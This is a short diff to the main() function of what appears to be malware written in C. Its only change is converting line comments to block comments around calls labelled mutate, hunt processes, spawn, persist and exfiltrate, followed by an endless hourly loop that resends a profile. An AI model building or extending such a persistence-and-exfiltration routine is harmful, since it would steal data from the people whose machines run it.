@@ -1,27 +1,26 @@
 #include <aether.h>
 
-/**
- * Entry 0x00
- */
+/* Entry 0x00 */
+
 int main(void) {    
-    // Mutate
+    /* Mutate */
     mutator();
     
-    // Hunt 
+    /* Hunt */
     hunt_procs();
     
-    // Spawn
+    /* Spawn */
     Spawn();
 
-    // Persiste
+    /* Persiste */
     persist();
     
-    // Exfil
+    /* Exfil */
     sendProfile();
     
-    // Keep it alive,
+    /* Keep it alive, */
     while (1) {
-        sleep(3600);  // Every hour
+        sleep(3600);  /* Every hour */
         sendProfile();
     }
     
